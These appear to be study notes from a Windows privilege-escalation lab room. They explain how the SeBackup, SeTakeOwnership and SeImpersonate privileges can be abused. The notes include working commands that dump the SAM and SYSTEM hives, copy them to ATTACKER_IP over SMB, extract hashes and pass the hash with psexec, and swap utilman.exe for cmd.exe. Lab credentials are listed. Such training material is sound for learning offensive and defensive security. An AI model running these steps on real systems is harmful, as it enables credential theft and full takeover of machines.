>**Each user has a set of assigned privileges that can be checked with the following command:**
```sh
whoami /priv
```
You can find a comprehensive list of exploitable privileges on the [Priv2Admin](https://github.com/gtworek/Priv2Admin) Github project.

## SeBackup / SeRestore

   - The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place.
   - The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.
   - Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash.

**DELETE** - Log in to the target machine via RDP using the following credentials: 
**User:** `THMBackup`

**Password:** `CopyMaster555`

This account is part of the "Backup Operators" group, which by default is granted the SeBackup and SeRestore privileges.
We will need to open a command prompt using the "Open as administrator" option to use these privileges. We will be asked to input our password again to get an elevated console:

>Once on the command prompt, we can check our privileges with the following command:
```sh
whoami /priv
```
![[windows_privesc6.png]]

**To backup the SAM and SYSTEM hashes, we can use the following commands:**
```sh
C:\> reg save hklm\system C:\Users\THMBackup\system.hive 
The operation completed successfully. 

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive 
The operation completed successfully.
```
   - This will create a couple of files with the registry hives content.
   - We can now copy these files to our attacker machine using SMB or any other available method.

**For SMB, we can use impacket's `smbserver.py` to start a simple SMB server with a network share in the current directory of our AttackBox:**
```sh
user@attackerpc$ mkdir share 

user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```
   - This will create a share named `public` pointing to the `share` directory, which requires the username and password of our current windows session.

**After this, we can use the `copy` command in our windows machine to transfer both files to our AttackBox:**
```powershell
C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\ 

C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```

**Use impacket to retrieve the users' password hashes:** - 
```sh
user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```

![[windows_privesc7.png]]

**We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:**
```sh
python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP
```

![[windows_privesc8.png]]

## SeTakeOwnership

   - The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable.
Log in to the target machine via RDP using the following credentials:

**User:** `THMTakeOwnership`

**Password:** `TheWorldIsMine2022`

To get the SeTakeOwnership privilege, we need to open a command prompt using the "Open as administrator" option. We will be asked to input our password to get an elevated console:

![[windows_privesc9.png]]

**We can check our privileges with the following command:**
```powershell
C:\> whoami /priv
```

![[windows_privesc10.png]]

**We'll abuse `utilman.exe` to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:**
![[windows_privesc11.png]]
- Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file.

**To replace utilman, we will start by taking ownership of it with the following command:**
```powershell
takeown /f C:\Windows\System32\Utilman.exe
```

![[windows_privesc12.png]]
 - Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need.

**To give your user full permissions over utilman.exe you can use the following command:**
```powershell
C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```

![[windows_privesc13.png]]

**After this, we will replace utilman.exe with a copy of cmd.exe:**
```powershell
C:\Windows\System32\> copy cmd.exe utilman.exe
```

**To trigger utilman, we will lock our screen from the start button:**
![[windows_privesc14.png]]
- And finally, proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges.

**Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:**
![[windows_privesc15.png]]

## SeImpersonate / SeAssignPrimaryToken

   - These privileges allow a process to impersonate other users and act on their behalf.
   - Impersonation usually consists of being able to spawn a process or thread under the security context of another user.
   - Impersonation is easily understood when you think about how an FTP server works.
   - The FTP server must restrict users to only access the files they should be allowed to see.

**Let's assume we have an FTP service running with user `ftp`. Without impersonation, if user Ann logs into the FTP server and tries to access her files, the FTP service would try to access them with its access token rather than Ann's:**
![[windows_privesc16.png]]
For the files to be served correctly, they would need to be accessible to the `ftp` user.

**There are several reasons why using ftp's token is not the best idea:**

   - In the example above, the FTP service would be able to access Ann's files, but not Bill's files, as the DACL in Bill's files doesn't allow user `ftp`. This adds complexity as we must manually configure specific permissions for each served file/directory.
   - This makes it impossible to delegate the authorisation to the operating system; therefore, the FTP service must implement it. - If the FTP service were compromised at some point, the attacker would immediately gain access to all of the folders to which the `ftp` user has access.

**If, on the other hand, the FTP service's user has the SeImpersonate or SeAssignPrimaryToken privilege, all of this is simplified a bit, as the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf:**
![[windows_privesc17.png]]

   - Now, if user Ann logs in to the FTP service and given that the ftp user has impersonation privileges, it can borrow Ann's access token and use it to access her files.
   - As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.
   - In Windows systems, you will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges.
   - Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs.

**To elevate privileges using such accounts, an attacker needs the following:**

1. To spawn a process so that users can connect and authenticate to it for impersonation to occur.
2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.

We will use RogueWinRM exploit to accomplish both conditions.

Let's start by assuming we have already compromised a website running on IIS and that we have planted a web shell on the following address: 
http://10.10.208.165/

**We can use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest for this task:**
![[windows_privesc18.png]]
   - To use RogueWinRM, we first need to upload the exploit to the target machine. For your convenience, this has already been done, and you can find the exploit in the `C:\tools\` folder.
   - The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges.
   - Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.